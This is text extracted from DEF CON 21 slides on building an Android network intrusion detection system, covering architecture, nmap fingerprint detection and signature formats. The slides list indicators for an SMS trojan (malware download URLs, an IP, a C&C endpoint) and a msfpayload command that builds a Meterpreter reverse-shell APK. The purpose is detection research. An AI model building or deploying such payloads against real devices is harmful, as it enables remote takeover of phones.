  can	
  do	
  whatever	
  I	
  want	
  with	
  the	
packets:	
   analyze,	
   process,	
   modify	
them
§	
  This	
  is	
  done	
  in	
  Real-­‐7me.
SUMMARY
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
AndroIDS
§	
   Create	
   an	
   open	
   source	
   network-­‐based	
   intrusion	
   detecIon	
   system	
(IDS)	
   and	
   network-­‐based	
   intrusion	
   protecIon	
  system	
   (IPS)	
   has	
   the	
ability	
   to	
   perform	
   real-­‐Ime	
   traﬃc	
   analysis	
   and	
   packet	
   logging	
   on	
Internet	
  Protocol	
  (IP)	
  networks:
§	
  It	
  should	
  feature:
§	
  Protocol	
  analysis
§	
  Content	
  searching
§	
  Content	
  matching
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
IDS	
  ARCHITECTURE:	
  SENSOR
§	
   Runs	
   conInuously	
   without	
   human	
supervision	
  and	
  feature:
§	
  Analyze	
  traﬃc
§	
  Send	
  push	
  alerts	
  to	
  the	
  Android	
  device	
in	
  order	
  to	
  warn	
  the	
  user	
  about	
  the	
  threat
§	
   Report	
   to	
   Logging	
   Server	
   Custom	
reacIve	
  acIons:
§	
  Drop	
  speciﬁc	
  packet
§	
  Add	
  new	
  rule	
  in	
  iptables	
  ﬁrewall
§	
  Launch	
  script	
  /	
  module
§	
   Sync	
   aaack	
   signatures	
   to	
   keep	
   them	
updated.
§	
  It	
  should	
  impose	
  minimal	
  overhead.
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
IDS	
  ARCHITECTURE:	
  SERVER
§	
   The	
   server	
   is	
   running	
   inside	
   a	
   Linux	
   Box,	
   and	
   is	
   receiving	
   all	
   the	
messages	
  the	
  Android	
  sensor	
  is	
  sending.
§	
  Server	
  is	
  responsible	
  for:
§	
  Send	
  signatures	
  to	
  remote	
  devices
§	
  Store	
  events	
  in	
  database
§	
  Detects	
  staIsIcal	
  anomalies	
  &	
  analysis	
  real-­‐Ime.
Android
Device
Internet
Firewall
IDS	
  Server	
  &
Database
Web
Interface
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
PROTOCOL	
  ANALYSIS
LOOKS	
  LIKE	
  I	
  PICKED	
  THE	
  WRONG	
  WEEK
TO	
  QUIT	
  SNIFFING	
  PACKETS
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
EXAMPLE
§	
  Packet	
  with	
  FIN,	
  SYN,	
  PUSH	
  and	
  URG	
  ﬂags	
  ac7ve.	
§	
  Report	
  to	
  the	
  Central	
  Logger	
  and	
  DROP	
  the	
  packet.
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
REMOTE	
  OS	
  FINGERPRINTING
§	
  Detect	
  and	
  drop	
  packet	
  sent	
  from	
  well-­‐known	
  scanning	
  tools.
§	
  nmap	
  OS	
  ﬁngerprin7ng	
  works	
  by	
  sending	
  up	
  to	
  16	
  TCP,	
  UDP,	
  and	
  ICMP	
  probes	
to	
  known	
  open	
  and	
  closed	
  ports	
  of	
  the	
  target	
  machine.
SEQUENCE	
  GENERATION	
  (SEQ,	
  OPS,	
  WIN	
  &	
  T1)
ICMP	
  ECHO	
  (IE)
TCP	
  EXPLICIT	
  CONGESTION	
  NOTIFICATION	
  (ECN)
TCP	
  T2-­‐T7
UDP
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
PATTERN	
  MATCHING
I’M	
  WATCHING	
  YOU...
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
SIGNATURE	
  FORMAT
§	
  With	
  the	
  help	
  of	
  custom	
  build	
  signatures,	
  the	
  framework	
  can	
  also	
  be	
used	
  to	
  detect	
  probes	
  or	
  aaacks	
  designed	
  for	
  mobile	
  devices
§	
  Useful	
  signatures	
  from	
  Snort	
  and	
  Emerging	
  Threats
§	
  Convert	
  snort-­‐like	
  rules	
  to	
  a	
  friendly	
  format:
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
USSD	
  EXPLOIT
§	
  A	
  USSD	
  code	
  is	
  entered	
  into	
  phones	
  to	
  perform	
acIons.
§	
   They	
  are	
   mainly	
   used	
  by	
   network	
   operators	
   to	
provide	
   customers	
   with	
   easy	
   access	
   to	
   pre-­‐
conﬁgured	
  services,	
  including:
§	
  call-­‐forwarding
§	
  balance	
  inquiries
§	
  mulIple	
  SIM	
  funcIons.
§	
  The	
  HTML	
  code	
  to	
  execute	
  such	
  an	
  acIon	
  is	
  as	
  follows:
Click	
  here	
  to	
  call
§	
  Example	
  exploit:
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
WEB	
  SIGNATURES
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
MALWARE
§	
  ANDR.TROJAN.SMSSEND
§	
  Download	
  from:
§	
  hxxp://adobeﬂashplayer-­‐up.ru/?a=RANDOM_CHARACTERS	
  –	
  93.170.107.184	
§	
  hxxp://googleplaynew.ru/?a=RANDOM_CHARACTERS	
  –	
  93.170.107.184
§	
  hxxp://browsernew-­‐update.ru/?a=RANDOM_CHARACTERS	
  –	
  93.170.107.184
§	
  Once	
  executed,	
  connect	
  to	
  C&C:	
  gaga01.net/rq.php
§oard=unknown;brand=generic;device=generic;imei=XXXXXX;imsi=XXXXXX;session_i
d=1;operator=XXX;sms0=XXXXXX;sms1=XXXXXX;sms2=XXXXXX;]me=XXXXXX;]mezo
ne=XXXXXX
§	
  Search	
  paaern:	
  rq.php
§	
  METERPRETER
§	
  It	
  features	
  command	
  history,	
  tab	
  compleIon,	
channels,	
  and	
  more.
§	
  Let’s	
  try:
$	
  msfpayload	
  android/meterpreter/reverse_tcp	
  LHOST=192.168.0.20	
  R	
  >	
  meter.apk
$	
  ﬁle	
  meter.apk	
  meter.apk:	
  Zip	
  archive	
  data,	
  at	
  least	
  v2.0	
  to	
  extract
DEFCON 21
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
T	
  H	
  A	
  N	
  K	
  Y	
  O	
  U	
  !
How	
  i	
  met	
  your	
  packet
BUILDING AN ANDROID IDS ON NETWORK LEVEL
DEFCON 21
Jaime	
  Sánchez
@segofensiva
PI:EMAIL